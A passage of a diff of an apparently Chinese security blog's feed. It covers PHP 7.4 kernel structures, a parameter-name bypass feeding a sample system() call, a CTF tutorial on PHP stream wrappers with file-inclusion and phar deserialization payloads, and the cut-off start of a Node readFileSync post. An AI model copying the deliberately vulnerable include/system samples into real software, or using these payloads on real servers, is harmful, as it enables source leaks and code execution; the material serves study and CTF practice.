class="line">        <span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">        <span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">        <span class="type">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">        <span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">        <span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">        <span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">    &#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>其中<code>value</code>是真正保存数据的字段。其类型<code>zend_value</code>定义如下：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">    zend_long         lval;             <span class="comment">/* long value */</span></span><br><span class="line">    <span class="type">double</span>            dval;             <span class="comment">/* double value */</span></span><br><span class="line">    zend_refcounted  *counted;</span><br><span class="line">    zend_string      *str;</span><br><span class="line">    zend_array       *arr;</span><br><span class="line">    zend_object      *obj;</span><br><span class="line">    zend_resource    *res;</span><br><span class="line">    zend_reference   *ref;</span><br><span class="line">    zend_ast_ref     *ast;</span><br><span class="line">    zval             *zv;</span><br><span class="line">    <span class="type">void</span>             *ptr;</span><br><span class="line">    zend_class_entry *ce;</span><br><span class="line">    zend_function    *func;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint32_t</span> w1;</span><br><span class="line">        <span class="type">uint32_t</span> w2;</span><br><span class="line">    &#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure>
 
-<p>正因为<code>_zend_value</code>是个联合体（union），php才在zend引擎的基础上实现了弱类型。</p>
+<p>正因为<code>zend_value</code>是个联合体（union），php才在zend引擎的基础上实现了弱类型。</p>
 <blockquote>
 <p>这里使用联合体而不是用结构体是出于空间利用率的考虑，因为一个变量同时只能属于一种类型。如果使用结构体的话将会不必要的浪费空间，而php中的所有逻辑都围绕变量来进行的，这样的话，内存浪费将是十分大的。这种做法成本小但收益非常大。</p>
 </blockquote>
-<p>zend引擎根据zval结构体中的<code>type</code>字段来储存一个变量的真正类型，然后根据<code>type</code>来选择如何获取<code>value</code>的值。对应的不同类型定义如下：</p>
+<p>可以看出，除long、double类型直接存储值外，其它类型都为指针，指向各自的结构。zend引擎根据<code>zval</code>结构体中的<code>type</code>字段来储存一个变量的真正类型，然后根据<code>type</code>来选择如何获取<code>value</code>的值。对应的不同类型定义如下：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_UNDEF                    0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_NULL                     1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_FALSE                    2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_TRUE                     3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_LONG                     4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_DOUBLE                   5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_STRING                   6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ARRAY                    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_OBJECT                   8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_RESOURCE                 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_REFERENCE                10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_CONSTANT_AST             11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_INDIRECT                 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_PTR                      14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ALIAS_PTR                15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IS_ERROR                   15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IS_BOOL                    16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_CALLABLE                 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ITERABLE                 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_VOID                     19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IS_NUMBER                  20</span></span><br></pre></td></tr></table></figure>
 
 <p>例如对于整形数据，此时<code>zval.type = IS_LONG</code>，zend引擎就去取<code>zval.value.lval</code>。如果是双精度或float数据，此时<code>zval.type = IS_DOUBLE</code>，则会去取<code>zval.value</code>的<code>dval</code>。</p>
@@ -615,8 +291,8 @@
 <p><strong>val</strong>：字符串的内容。<code>val[1]</code>并不表示只能存储1个字节，在字符串分配时实际上是操作了<code>malloc(sizeof(zend_string) + 字符串长度)</code>，也就是会多分配一些内存，而多出来的内存起始位置就是val，这样就可以将字符串直接存储到val，并通过val进行读取。</p>
 <h1><span id="数组">数组</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_array</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ZEND_ENDIAN_LOHI_4(</span><br><span class="line">                zend_uchar    flags,</span><br><span class="line">                zend_uchar    _unused,</span><br><span class="line">                zend_uchar    nIteratorsCount,</span><br><span class="line">                zend_uchar    _unused2)</span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> flags;</span><br><span class="line">    &#125; u;</span><br><span class="line">    <span class="type">uint32_t</span>          nTableMask;</span><br><span class="line">    Bucket           *arData;</span><br><span class="line">    <span class="type">uint32_t</span>          nNumUsed;</span><br><span class="line">    <span class="type">uint32_t</span>          nNumOfElements;</span><br><span class="line">    <span class="type">uint32_t</span>          nTableSize;</span><br><span class="line">    <span class="type">uint32_t</span>          nInternalPointer;</span><br><span class="line">    zend_long         nNextFreeElement;</span><br><span class="line">    <span class="type">dtor_func_t</span>       pDestructor;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p><strong>nTableMask</strong>：根据key的hash code映射元素存储位置时有用到，它的值是<code>nTableSize</code>的负数。</p>
-<p><strong>*arData</strong>：数组的每一个元素都保存在这里，默认指向第一个元素。其数据类型<code>Bucket</code>定义如下。</p>
+<p><strong>nTableMask</strong>：计算Bucket索引时的掩码，它的值是<code>nTableSize</code>的负数。</p>
+<p><strong>*arData</strong>：Bucket数组。php数组的每一个元素都保存在这里，默认指向第一个元素。其数据类型<code>Bucket</code>定义如下。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Bucket</span> &#123;</span></span><br><span class="line">    zval              val;</span><br><span class="line">    zend_ulong        h;                <span class="comment">/* hash value (or numeric index)   */</span></span><br><span class="line">    zend_string      *key;              <span class="comment">/* string key or NULL for numerics */</span></span><br><span class="line">&#125; Bucket;</span><br></pre></td></tr></table></figure>
 
 <p><strong>nNumUsed</strong>：当前使用的Bucket数。</p>
@@ -624,8 +300,8 @@
 <p>但不都是有效的，因为有的Bucket虽然被unset了但是没有马上被删除，而是做了IS_UNDEF标记。</p>
 </blockquote>
 <p><strong>nNumOfElements</strong>：有效的Bucket数，这个与上面不同，这里记录的是真实有效的Bucket数量。</p>
-<p><strong>nTableSize</strong>：数组的总容量。</p>
-<p><strong>nIternalPointer</strong>：当前遍历的指针。</p>
+<p><strong>nTableSize</strong>：数组的大小。</p>
+<p><strong>nIternalPointer</strong>：当前的指针位置。</p>
 <p><strong>nNextFreeElement</strong>：下一个索引的值，比如每次给数组新增数据时，该值就会加一。</p>
 <p><strong>pDestructor</strong>：析构函数，在删除或覆盖某个元素时，调用该函数，可以对旧元素进行清理。</p>
 <p><strong>u</strong>：这里的u主要起到辅助作用。</p>
@@ -640,9 +316,341 @@
 <p><strong>handlers</strong>：对象操作的处理函数，比如成员属性的读写、成员方法的获取、对象的销毁克隆等。</p>
 <p><strong>properties</strong>：普通成员属性的哈希表，初始化对象时该值为NULL。</p>
 <p><strong>properties_table</strong>：用来存储普通成员的属性值，对象对非静态成员属性的操作就是通过这个数组。</p>
+<h1><span id="资源">资源</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_resource</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="type">int</span>               handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">    <span class="type">int</span>               type;</span><br><span class="line">    <span class="type">void</span>             *ptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>资源指的是tcp连接、文件句柄等等类型，这种类型比较灵活，可以随意定义struct。后面再分析这种类型，这里先略过。</p>
+<h1><span id="引用">引用</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_reference</span> &#123;</span></span><br><span class="line">    zend_refcounted_h              gc;</span><br><span class="line">    zval                           val;</span><br><span class="line">    zend_property_info_source_list sources;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>引用是php中比较特殊的一种类型，它实际是指向另外一个php变量，对它的修改会直接改动实际指向的<code>zval</code>，可以简单的理解为C中的指针。在php中通过<code>&amp;</code>操作符产生一个引用变量，不管以前的类型是什么，<code>&amp;</code>首先会创建一个<code>zend_reference</code>结构，其内嵌了一个<code>zval</code>，这个zval的<code>value</code>指向原来zval的value（如果是布尔、整形、浮点则直接复制原来的值），然后将原zval的类型修改为<code>IS_REFERENCE</code>，原zval的value指向新创建的<code>zend_reference</code>结构。</p>
+</blockquote>
 ]]></content>
       <tags>
         <tag>php74-kernel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php传参特殊字符替换特性源码简析</title>
+    <url>/2022/10/31/php_carafeat/</url>
+    <content><![CDATA[<p>上课时突然想起一个很久以前遇到过的php特性，估摸着也不算复杂，简单写个源码分析。环境是<code>php-7.4.27</code>。</p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa_bbb.cc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa_bbb.cc&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们先正常传参<code>whoami</code>，从空白的返回看来似乎并没有按照我们预想的那样执行系统命令。通过动态调试可以发现，传入的参数已不再带有<code>.</code>，而是被替换为了<code>_</code>。</p>
+<p><img src="/images/20221031184604.png"></p>
+<p>定位参数处理的C源码位置，发现在源代码main文件夹下的<code>php_variables.c</code>文件中对传入的参数进行了处理。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ensure that we don&#x27;t have spaces or dots in the variable name (not binary safe) */</span></span><br><span class="line"><span class="keyword">for</span> (p = var; *p; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        *p=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*p == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        is_array = <span class="number">1</span>;</span><br><span class="line">        ip = p;</span><br><span class="line">        *p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码将传入参数名中的空格和<code>.</code>全部替换为<code>_</code>，和调试显示的结果一致。</p>
+<p>注意后面紧跟着的判断语句，很明显这是在通过传入的参数名判断我们传入的参数是否是数组类型的数据。遇到参数名中的<code>[</code>后会直接break跳出匹配循环，这将有可能成为绕过的突破点。我们继续往下跟进代码执行流。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        ip++;</span><br><span class="line">        index_s = ip;</span><br><span class="line">        <span class="keyword">if</span> (*ip==<span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">            index_s = <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ip = <span class="built_in">strchr</span>(ip, <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ip) &#123;</span><br><span class="line">                <span class="comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span></span><br><span class="line">                *(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>is_array</code>被置<code>1</code>，进入<code>if</code>语句，分析这段代码可知参数名中的<code>[</code>将被替换为<code>_</code>，结合上一个代码块中的<code>break</code>，在这之后的<code>.</code>和空格也不会再进行解析替换了。</p>
+<p>所以我们若输入<code>aaa[bbb.cc</code>，则参数名将被解析为<code>aaa_bbb.cc</code>，成功传入正确的参数。</p>
+<p><img src="/images/20221031190650.png"></p>
+<p>经过测试后<code>$_POST</code>传参同理。</p>
+<blockquote>
+<p>Note: 這個部分在php8已經不會發生了<sup>[1]</sup>，因為在<code>*(index_s - 1) = &#39;_&#39;;</code>會再檢查一次是否有不符合的字元:</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">*(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">/* PHP variables cannot contain <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> their names, so we replace the characters <span class="keyword">with</span> a <span class="string">&#x27;_&#x27;</span> */</span><br><span class="line"><span class="keyword">for</span> (p = index_s; *p; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span> || *p == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        *p = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><del>（谁会在、写代码的时候、传这么奇怪的参数啊！）</del></p>
+<p>[1] <a href="https://github.com/php/php-src/blob/33375e927c2cce8ca353d199a9d7275c60fb41e4/main/php_variables.c#L196-L201">php8参数名解析代码变动</a></p>
+]]></content>
+      <tags>
+        <tag>php-feature</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php伪协议解析及适用场景总结</title>
+    <url>/2021/12/21/php_wrappers/</url>
+    <content><![CDATA[<p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p>
+<span id="more"></span>
+
+<p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p>
+<p>希望自己以后不要再被这个考点麻住了的说</p>
+<p><a href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫）</del></a></p>
+<h1><span id="食材准备">食材准备</span></h1><p>所谓php伪协议，其实就是<a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
+<p>支持的种类分为十二种：</p>
+<p>file:// — 访问本地文件系统</p>
+<p>http:// – https:// — 访问 HTTP(s) 网址</p>
+<p>ftp:// – ftps:// — 访问 FTP(s) URLs</p>
+<p>php:// — 访问各个输入/输出流（I/O streams）</p>
+<p>zlib:// – bzip2:// – zip:// — 压缩流</p>
+<p>data:// — 数据（RFC 2397）</p>
+<p>glob:// — 查找匹配的文件路径模式</p>
+<p>phar:// — PHP 归档</p>
+<p>ssh2:// — Secure Shell 2</p>
+<p>rar:// — RAR</p>
+<p>ogg:// — 音频流</p>
+<p>expect:// — 处理交互式的流</p>
+<p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p>
+<p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p>
+<h1><span id="厨房交响">厨房交响</span></h1><h2><span id="phpfilter-你吧来拿">php://filter — 你吧来拿</span></h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p>
+<blockquote>
+<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p>
+<p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p>
+</blockquote>
+<p>常用参数概览</p>
+<blockquote>
+<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p>
+<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+</blockquote>
+<p>常用过滤器</p>
+<blockquote>
+<p>convert.base64-encode &amp; convert.base64-decode</p>
+<p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
+</blockquote>
+<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时index.php的同级目录下有个叫做test.txt的文件。</p>
+<p>试图读取里面的信息</p>
+<p><img src="/images/BUU/202112211700194.png"></p>
+<p>不对啊，我明明往里面写了东西的呢</p>
+<p>让我们用过滤器看看是怎么回事</p>
+<p><img src="/images/BUU/202112211703524.png"></p>
+<p>然后编回来</p>
+<p><img src="/images/BUU/202112211711151.png"></p>
+<p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p>
+<h2><span id="phpinput-这是替身攻击">php://input — 这是替身攻击</span></h2><blockquote>
+<p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p>
+</blockquote>
+<p>那既然都提到POST了，能不带GET玩嘛~</p>
+<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>试图搞事</p>
+<p><img src="/images/BUU/202112211942039.png"></p>
+<p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p>
+<p><strong>替 身 觉 醒</strong></p>
+<p><img src="/images/BUU/202112211952241.png"></p>
+<p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p>
+<p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p>
+<p>某些情况下 绕过GET型传参的waf很好用。</p>
+<p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p>
+<h2><span id="file-让我访问你网站正不正常啊">file:// — 让我访问你网站正不正常啊</span></h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p>
+<p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p>
+<p><img src="/images/BUU/202112211522406.png"></p>
+<p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p>
+<p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p>
+<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure>
+
+<p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p>
+<p><img src="/images/BUU/202112212116212.png"></p>
+<h2><span id="phar-有基佬开我裤链">phar:// — 有基佬开我裤链</span></h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p>
+<p>在周大福里经常作为反序列化考点出现。</p>
+<p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p>
+<h3><span id="本地试吃">本地试吃</span></h3><p>我们先试着创建一个phar文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
+<p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p>
+<p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p>
+<p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p>
+<p><img src="/images/BUU/202112211610188.png"></p>
+<p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUU/202112211623190.png"></p>
+<p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p>
+<p><strong>一种经典周大福</strong></p>
+<p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p>
+<h2><span id="data-皇军托我给您带个话">data:// — 皇军托我给您带个话</span></h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p>
+<p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p>
+<h3><span id="本地试吃">本地试吃</span></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUU/202112212011428.png"></p>
+<h2><span id="glob-我来了就是查寝来了">glob:// — 我来了就是查寝来了</span></h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面这段代码实现了一个简单的文件查看器的功能。</p>
+<p><img src="/images/BUU/202112262150620.png"></p>
+<p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p>
+<p><img src="/images/BUU/202112262157376.png"></p>
+<p>此文章发布于2021.12.21，更新于2022.9.16。</p>
+]]></content>
+      <tags>
+        <tag>php-wrappers</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一个fs.readFileSync的trick浅析</title>
+    <url>/2022/09/19/readFileSync/</url>
+    <content><![CDATA[<p>一个<code>fs.readFileSync</code>的trick浅析</p>
+<span id="more"></span>
+
+<p>设想下面一个简单的代码片段：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;bad hacker!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">file</span>).<span 